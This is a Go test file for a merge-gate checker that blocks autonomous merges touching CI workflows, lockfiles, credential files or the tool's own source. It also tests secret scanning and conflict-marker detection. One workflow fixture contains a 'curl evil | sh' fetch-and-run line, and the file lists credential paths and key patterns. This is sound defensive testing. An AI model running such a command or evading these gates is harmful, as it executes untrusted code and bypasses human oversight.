package content

import (
	"strings"
	"testing"
)

// a minimal real unified diff touching one ordinary source file.
const cleanDiff = `diff --git a/pkg/foo.go b/pkg/foo.go
index 111..222 100644
--- a/pkg/foo.go
+++ b/pkg/foo.go
@@ -1,3 +1,4 @@
 package foo

+func Added() {}
`

func TestTouchedPathsParsesGitDiff(t *testing.T) {
	got := TouchedPaths(cleanDiff)
	if len(got) != 1 || got[0] != "pkg/foo.go" {
		t.Fatalf("touched=%v want [pkg/foo.go]", got)
	}
}

func TestTouchedPathsHandlesAddDeleteRename(t *testing.T) {
	d := `diff --git a/new.txt b/new.txt
new file mode 100644
--- /dev/null
+++ b/new.txt
@@ -0,0 +1 @@
+hi
diff --git a/old.txt b/old.txt
deleted file mode 100644
--- a/old.txt
+++ /dev/null
@@ -1 +0,0 @@
-bye
diff --git a/from.txt b/to.txt
similarity index 100%
rename from from.txt
rename to to.txt
`
	got := TouchedPaths(d)
	want := map[string]bool{"new.txt": true, "old.txt": true, "from.txt": true, "to.txt": true}
	if len(got) != len(want) {
		t.Fatalf("touched=%v want %v", got, want)
	}
	for _, p := range got {
		if !want[p] {
			t.Fatalf("unexpected touched path %q in %v", p, got)
		}
	}
}

func TestDenylistClasses(t *testing.T) {
	cases := []struct {
		path    string
		blocked bool
	}{
		{".github/workflows/ci.yml", true},
		{".github/actions/setup/action.yml", true},
		{".gitlab-ci.yml", true},
		{"package-lock.json", true},
		{"yarn.lock", true},
		{"go.sum", true},
		{"scripts/postinstall.js", true},
		{"Dockerfile", true},
		{"docker/Dockerfile.prod", true},
		{".devcontainer/devcontainer.json", true},
		{".env", true},
		{".env.production", true},
		{"deploy/key.pem", true},
		{"secrets/token.txt", true},
		{"internal/content/content.go", true}, // the denylist itself
		{"internal/engine/engine.go", true},   // Flowbee source
		{"cmd/flowbee/serve.go", true},
		{"flows/build.yaml", true},
		{"flowbee.yaml", true},
		// ALL of tools/ is flowbee source (regression: seedidentities + any new tool slipped
		// the gate when only archcheck/providerlint were listed by name).
		{"tools/seedidentities/main.go", true},
		{"tools/archcheck/main.go", true},
		{"tools/somethingnew/x.go", true},
		// dependency manifests are supply-chain escalation vectors (a replace directive /
		// compromised version), not just the lockfiles.
		{"go.mod", true},
		{"package.json", true},
		{"Cargo.toml", true},
		// ordinary application paths are clear.
		{"pkg/foo.go", false},
		{"README.md", false},
		{"src/app/main.ts", false},
		{"docs/design.md", false},
	}
	for _, c := range cases {
		if got := IsDenylisted(c.path); got != c.blocked {
			t.Errorf("IsDenylisted(%q)=%v want %v", c.path, got, c.blocked)
		}
	}
}

// TestDenylistCaseFolding locks the case-fold bypass fix: a worker on a case-sensitive Linux
// box can commit a protected file under a case-VARIANT path, which a case-sensitive matcher
// cleared while the file still lands in the real protected location on GitHub's
// case-insensitive `.github` resolution / a macOS runner — a CRITICAL autonomous-merge
// bypass of every protected class. Every class must match case-insensitively; both the
// IsDenylisted and the DenylistHits dispatch paths are checked.
func TestDenylistCaseFolding(t *testing.T) {
	blocked := []string{
		".GitHub/workflows/evil.yml", ".github/Workflows/evil.yml", ".GITHUB/actions/x/action.yml",
		"DOCKERFILE", "docker/Dockerfile.PROD",
		"Go.sum", "GO.MOD", "Package-Lock.json", "Cargo.TOML", "Gemfile", "GEMFILE",
		".ENV", ".Env.production", "deploy/key.PEM", "id_RSA", ".NPMRC",
		"Internal/engine/x.go", "CMD/flowbee/x.go", "Flows/build.yaml", "Flowbee.yaml", "Tools/x/main.go",
		"secrets/TOKEN.txt", "SECRETS/token.txt",
	}
	for _, p := range blocked {
		if !IsDenylisted(p) {
			t.Errorf("IsDenylisted(%q): case-variant protected path must be denylisted (case-fold bypass)", p)
		}
		if hits := DenylistHits([]string{p}); len(hits) == 0 {
			t.Errorf("DenylistHits(%q): case-variant protected path must be hit", p)
		}
	}
	// ordinary paths stay clear regardless of case.
	for _, p := range []string{"pkg/Foo.go", "README.MD", "src/App/Main.ts"} {
		if IsDenylisted(p) {
			t.Errorf("ordinary path %q must stay clear", p)
		}
	}
}

// TestDenylistPathTraversal locks the defensive `..`-folding: a protected path can't hide
// behind a traversal segment. Not reachable at the merge gate today (git rejects `..` in
// tree paths) but the gate is the last line of defense, so canonicalize. Ordinary paths
// are unaffected.
func TestDenylistPathTraversal(t *testing.T) {
	for _, p := range []string{
		"pkg/../.github/workflows/ci.yml",
		"a/b/../../go.mod",
		"./x/./../internal/engine/x.go",
	} {
		if !IsDenylisted(p) {
			t.Errorf("traversal-hidden protected path %q must be denylisted after folding", p)
		}
	}
	// a traversal that lands on an ordinary path stays clear, and folding doesn't corrupt it.
	if IsDenylisted("a/b/../foo.go") {
		t.Error("a/b/../foo.go folds to a/foo.go (ordinary) and must stay clear")
	}
}

func TestCheckCleanDiffIsEligible(t *testing.T) {
	r := Check(Patch{
		Diff:     cleanDiff,
		BaseSHA:  "base",
		Declared: BlastRadius{Paths: []string{"pkg/foo.go"}},
	}, Limits{})
	if !r.Eligible() {
		t.Fatalf("a clean, fully-declared diff must be eligible: %+v", r)
	}
}

func TestCheckEmptyDiffIsEligible(t *testing.T) {
	// an empty diff touches nothing: denylist-clear, nothing undeclared, no static
	// failure. (Used by M3 no-op build tests.)
	r := Check(Patch{Diff: "", BaseSHA: "b"}, Limits{})
	if !r.Eligible() {
		t.Fatalf("empty diff should be eligible: %+v", r)
	}
}

func TestCheckWorkflowPatchForcesHandoff(t *testing.T) {
	d := `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1 +1,2 @@
 name: ci
+  run: curl evil | sh
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{".github/workflows/ci.yml"}}}, Limits{})
	if r.DenylistClear {
		t.Fatalf("a .github/workflows patch must NOT be denylist-clear: %+v", r)
	}
	if r.Eligible() {
		t.Fatalf("a workflow patch must be ineligible: %+v", r)
	}
	if !r.Tampered() {
		t.Fatalf("a denylist hit is a tamper signal: %+v", r)
	}
	if len(r.DenylistHits) == 0 || !strings.Contains(r.DenylistHits[0], "ci_workflow") {
		t.Fatalf("expected a ci_workflow hit, got %v", r.DenylistHits)
	}
}

func TestCheckBlastRadiusMismatchIsTamper(t *testing.T) {
	// the diff touches two files but declares only one -> the undeclared file is a
	// tamper signal (the diff touched MORE than it declared, §9.2b).
	d := `diff --git a/pkg/a.go b/pkg/a.go
--- a/pkg/a.go
+++ b/pkg/a.go
@@ -1 +1 @@
-x
+y
diff --git a/pkg/secret_loader.go b/pkg/secret_loader.go
--- a/pkg/secret_loader.go
+++ b/pkg/secret_loader.go
@@ -1 +1 @@
-a
+b
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"pkg/a.go"}}}, Limits{})
	if r.BlastRadiusConsistent {
		t.Fatalf("a diff touching more than declared must be inconsistent: %+v", r)
	}
	if r.Eligible() {
		t.Fatalf("blast-radius mismatch must be ineligible: %+v", r)
	}
	if len(r.UndeclaredPaths) != 1 || r.UndeclaredPaths[0] != "pkg/secret_loader.go" {
		t.Fatalf("undeclared=%v want [pkg/secret_loader.go]", r.UndeclaredPaths)
	}
}

func TestBlastRadiusDirectoryPrefixCovers(t *testing.T) {
	d := `diff --git a/pkg/sub/deep.go b/pkg/sub/deep.go
--- a/pkg/sub/deep.go
+++ b/pkg/sub/deep.go
@@ -1 +1 @@
-x
+y
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"pkg/sub"}}}, Limits{})
	if !r.BlastRadiusConsistent {
		t.Fatalf("a declared directory prefix should cover paths beneath it: %+v", r)
	}
}

func TestStaticChecksSecretScan(t *testing.T) {
	d := `diff --git a/config.go b/config.go
--- a/config.go
+++ b/config.go
@@ -1 +1,2 @@
 package config
+const Key = "AKIAIOSFODNN7EXAMPLE"
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"config.go"}}}, Limits{})
	if r.StaticChecksPass {
		t.Fatalf("an added AWS key must trip the secret-scan: %+v", r)
	}
	if r.Eligible() {
		t.Fatalf("a secret-tripping diff must be ineligible: %+v", r)
	}
}

func TestStaticChecksAppliesCleanKnownNegative(t *testing.T) {
	r := Check(Patch{
		Diff:              cleanDiff,
		Declared:          BlastRadius{Paths: []string{"pkg/foo.go"}},
		AppliesClean:      false,
		AppliesCleanKnown: true,
	}, Limits{})
	if r.StaticChecksPass {
		t.Fatalf("a proven non-applying patch must fail static checks: %+v", r)
	}
	// the SAME diff with an UNKNOWN apply state must NOT fail on that account.
	ok := Check(Patch{Diff: cleanDiff, Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}}, Limits{})
	if !ok.StaticChecksPass {
		t.Fatalf("an unknown apply state must not fail static checks: %+v", ok)
	}
}

func TestStaticChecksBinaryBlob(t *testing.T) {
	d := `diff --git a/blob.bin b/blob.bin
new file mode 100644
GIT binary patch
literal 4
Lc${NkU|;|M2><{9
`
	r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"blob.bin"}}}, Limits{})
	if r.StaticChecksPass {
		t.Fatalf("a binary blob must fail static checks: %+v", r)
	}
}

func TestStaticChecksSizeBound(t *testing.T) {
	big := cleanDiff + strings.Repeat("+x\n", 100)
	r := Check(Patch{Diff: big, Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}},
		Limits{MaxDiffBytes: 50})
	if r.StaticChecksPass {
		t.Fatalf("an oversize diff must fail static checks: %+v", r)
	}
}

func TestCheckIsDeterministic(t *testing.T) {
	p := Patch{Diff: cleanDiff, Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}}
	a := Check(p, Limits{})
	b := Check(p, Limits{})
	if a.Eligible() != b.Eligible() || len(a.DenylistHits) != len(b.DenylistHits) {
		t.Fatal("Check must be deterministic")
	}
}

func TestAllowOwnSourceRelaxesOnlyFlowbeeSource(t *testing.T) {
	mixed := "--- a/internal/x.go\n+++ b/internal/x.go\n@@ -0,0 +1 @@\n+x\n" +
		"--- a/go.sum\n+++ b/go.sum\n@@ -0,0 +1 @@\n+dep\n"
	if CheckWithPolicy(Patch{Diff: mixed}, Policy{AllowOwnSource: true}).DenylistClear {
		t.Fatal("AllowOwnSource must NOT drop the universal lockfile (go.sum) class")
	}
	pureSrc := "--- a/cmd/flowbee/x.go\n+++ b/cmd/flowbee/x.go\n@@ -0,0 +1 @@\n+x\n"
	if !CheckWithPolicy(Patch{Diff: pureSrc}, Policy{AllowOwnSource: true}).DenylistClear {
		t.Fatal("AllowOwnSource must clear a pure flowbee-source diff (the repo's own code)")
	}
	if Check(Patch{Diff: pureSrc}, Limits{}).DenylistClear {
		t.Fatal("default (control-plane) posture must STILL deny its own source")
	}
}

// TestCheckRejectsConflictMarkers: a diff that introduces leftover git conflict markers
// (<<<<<<< / >>>>>>> / the diff3 |||||||) fails the deterministic static gate, so it is not
// self_merge-eligible and takes handoff. This is the §9.2 "parse markers" check; the primary
// reachable source is a conflict_resolver that under-resolves a multi-hunk conflict.
func TestCheckRejectsConflictMarkers(t *testing.T) {
	mk := func(added string) string {
		return "diff --git a/pkg/foo.go b/pkg/foo.go\n--- a/pkg/foo.go\n+++ b/pkg/foo.go\n@@ -1 +1,3 @@\n func x() {}\n+" + added + "\n"
	}
	for _, marker := range []string{"<<<<<<< HEAD", ">>>>>>> feature-branch", "<<<<<<<", "||||||| merged common ancestors"} {
		r := Check(Patch{Diff: mk(marker), Declared: BlastRadius{Paths: []string{"pkg/foo.go"}}}, Limits{})
		if r.StaticChecksPass {
			t.Errorf("a leftover conflict marker %q must fail static checks; failures=%v", marker, r.StaticFailures)
		}
		if r.Eligible() {
			t.Errorf("a diff with conflict marker %q must NOT be self_merge-eligible", marker)
		}
	}
}

// TestCheckNoFalsePositiveOnMarkerLookalikes: lines that merely resemble markers must NOT be
// flagged — the ======= separator (markdown rule / ASCII divider), 8+ angle brackets (art),
// short runs, and inline (non-column-0) occurrences are all legitimate content.
func TestCheckNoFalsePositiveOnMarkerLookalikes(t *testing.T) {
	mk := func(added string) string {
		return "diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n@@ -1 +1,3 @@\n # Title\n+" + added + "\n"
	}
	for _, ok := range []string{"=======", "==============", "<<<", "<<<<<<<<", ">>>>>>>>>>", "look <<<<<<< inline"} {
		r := Check(Patch{Diff: mk(ok), Declared: BlastRadius{Paths: []string{"README.md"}}}, Limits{})
		if !r.StaticChecksPass {
			t.Errorf("marker-lookalike %q must NOT trip the conflict-marker check; failures=%v", ok, r.StaticFailures)
		}
	}
}

// TestModeChangeOnSpaceNamedWorkflowIsDenylisted: a chmod-only diff (no +++/---/rename header to
// recover the path) on a denylisted file whose name contains a SPACE must STILL classify the
// path. Git does not quote spaces, so the `diff --git a/<P> b/<P>` line is the sole path source
// and must be parsed symmetrically — else the workflow change clears the gate and self-merges.
func TestModeChangeOnSpaceNamedWorkflowIsDenylisted(t *testing.T) {
	const wf = ".github/workflows/deploy v2.yml"
	diff := "diff --git a/" + wf + " b/" + wf + "\nold mode 100644\nnew mode 100755\n"
	r := Check(Patch{Diff: diff, Declared: BlastRadius{Paths: []string{wf}}}, Limits{})
	if r.DenylistClear {
		t.Fatalf("a mode-change on a space-named workflow must hit the CI denylist class; it cleared (hits=%v)", r.DenylistHits)
	}
}

// TestSecretScanCatchesCommonProvidersOnInnocuousVar: high-risk provider key formats must be
// caught even when assigned to a NON-secret-ish variable (the context-free prefix patterns) —
// the LHS-anchored keyword/entropy check alone misses `data = "<key>"`. Each would otherwise be
// self-merge-eligible in an ordinary (non-denylisted) source file.
func TestSecretScanCatchesCommonProvidersOnInnocuousVar(t *testing.T) {
	cases := map[string]string{
		"anthropic":      "sk-ant-api03-" + strings.Repeat("aB3", 12),
		"github_fine":    "github_pat_11ABCDEFG0" + strings.Repeat("aB3", 10),
		"openai_proj":    "sk-proj-" + strings.Repeat("aB3", 12),
		"openai_classic": "sk-" + strings.Repeat("aB3", 16),
		"stripe":         "sk_live_" + strings.Repeat("aB3", 12),
		"google_apikey":  "AIza" + strings.Repeat("aB3c5", 7),
		"sendgrid":       "SG." + strings.Repeat("aB3", 8) + "." + strings.Repeat("xY9", 8),
		"google_oauth":   "ya29." + strings.Repeat("aB3", 12),
	}
	for name, secret := range cases {
		d := "diff --git a/config.go b/config.go\n--- a/config.go\n+++ b/config.go\n@@ -1 +1,2 @@\n package config\n+const data = \"" + secret + "\"\n"
		r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"config.go"}}}, Limits{})
		if r.StaticChecksPass {
			t.Errorf("%s key on an innocuous var must trip the secret-scan: %q", name, secret)
		}
	}
}

// TestSecretScanNoFalsePositiveOnOrdinaryStrings: ordinary identifiers/paths/URLs must NOT trip
// the new prefix patterns, so legitimate code isn't needlessly forced to the human gate.
func TestSecretScanNoFalsePositiveOnOrdinaryStrings(t *testing.T) {
	for _, ok := range []string{
		"this-is-a-normal-kebab-case-identifier-string",
		"https://example.com/path/to/resource?q=value",
		"github.com/samhotchkiss/flowbee/internal/content",
		"a/very/long/file/path/that/is/not/a/secret.go",
	} {
		d := "diff --git a/config.go b/config.go\n--- a/config.go\n+++ b/config.go\n@@ -1 +1,2 @@\n package config\n+const note = \"" + ok + "\"\n"
		r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"config.go"}}}, Limits{})
		if !r.StaticChecksPass {
			t.Errorf("ordinary string %q must NOT trip the secret-scan; failures=%v", ok, r.StaticFailures)
		}
	}
}

// TestSecretScanNoFalsePositiveOnStructLiteralTokenFields is the regression for a confirmed
// live false positive on THREE independent PRs, two separators: russ #3648/#3793 (Go
// struct-literal fields like `OpenRouterChatMaxTokens: openRouterChatMaxTokens,`, `:`
// separator) and #3811 (a TS `const key = normalizedAddressKey(address)` local-variable
// assignment, `=` separator). Both scored >=3.5 bits/char entropy on the RHS identifier,
// indistinguishable by entropy alone from a real random secret (camelCase identifiers
// routinely land ~3.9-4.1 bits/char, overlapping real secrets' range). Go/TS/JS cannot
// express a string literal without quotes, so an UNQUOTED RHS is syntactically guaranteed
// to be a reference/identifier, never credential material — that syntactic fact, not
// entropy, is what must gate this, regardless of which separator (`:` or `=`) matched.
func TestSecretScanNoFalsePositiveOnStructLiteralTokenFields(t *testing.T) {
	for _, line := range []string{
		"OpenRouterChatMaxTokens:                   openRouterChatMaxTokens,",
		"OpenRouterMaxCumulativePromptTokens:       openRouterMaxCumulativePromptTokens,",
		"EllieExtractionMaxSingleMsgTokens:         ellieExtractionMaxSingleMsgTokens,",
		"const key = normalizedAddressKey(address)",
	} {
		d := "diff --git a/config.go b/config.go\n--- a/config.go\n+++ b/config.go\n@@ -1 +1,2 @@\n package config\n+\t\t" + line + "\n"
		r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"config.go"}}}, Limits{})
		if !r.StaticChecksPass {
			t.Errorf("identifier-referencing assignment %q must NOT trip the secret-scan; failures=%v", line, r.StaticFailures)
		}
	}

	// the exemption must NOT swallow a real secret assigned WITH quotes, `:` or `=` alike
	// (Go/TS CAN express a string literal with quotes — that's exactly where a real secret
	// would live).
	for _, quoted := range []string{
		`Token:                              "AKIAIOSFODNN7EXAMPLE",`,
		`const token = "AKIAIOSFODNN7EXAMPLE"`,
	} {
		d := "diff --git a/config.go b/config.go\n--- a/config.go\n+++ b/config.go\n@@ -1 +1,2 @@\n package config\n+\t\t" + quoted + "\n"
		if r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"config.go"}}}, Limits{}); r.StaticChecksPass {
			t.Errorf("a QUOTED secret literal %q must still trip the secret-scan: %+v", quoted, r)
		}
	}

	// nor a flat-case (non-camelCase) unquoted value, either separator — a hex/snake_case
	// secret pasted in unquoted must still be caught; only the camelCase-identifier shape
	// (never a real secret's shape) is exempted.
	for _, flat := range []string{
		"token:                              deadbeefcafefeedfacefeeddeadbeef,",
		"token = deadbeefcafefeedfacefeeddeadbeef",
	} {
		d := "diff --git a/config.go b/config.go\n--- a/config.go\n+++ b/config.go\n@@ -1 +1,2 @@\n package config\n+\t\t" + flat + "\n"
		if r := Check(Patch{Diff: d, Declared: BlastRadius{Paths: []string{"config.go"}}}, Limits{}); r.StaticChecksPass {
			t.Errorf("a flat-case unquoted value %q must still trip the secret-scan: %+v", flat, r)
		}
	}
}

// TestDenylistExemptsEnvExampleTemplate is the regression for the OTHER half of the same live
// incident: .env.example is the conventional SAFE, git-committed placeholder counterpart to the
// real (gitignored) .env, and was blanket-denylisted identically to it — routing every PR that
// merely documents a new env var (both blocked PRs only ADDED empty/boolean config keys) to a
// human merge gate on filename alone. Recognized template suffixes are exempted; anything else
// prefixed .env. (.env.local, .env.production — likely to hold real per-environment secrets)
// stays denylisted, as does .env itself.
func TestDenylistExemptsEnvExampleTemplate(t *testing.T) {
	for _, p := range []string{".env.example", ".env.sample", ".env.template", ".env.dist", "backend/.env.example"} {
		if IsDenylisted(p) {
			t.Errorf("IsDenylisted(%q) = true, want false (safe template file)", p)
		}
	}
	for _, p := range []string{".env", ".env.local", ".env.production", ".env.development"} {
		if !IsDenylisted(p) {
			t.Errorf("IsDenylisted(%q) = false, want true (real env file, still denylisted)", p)
		}
	}
}
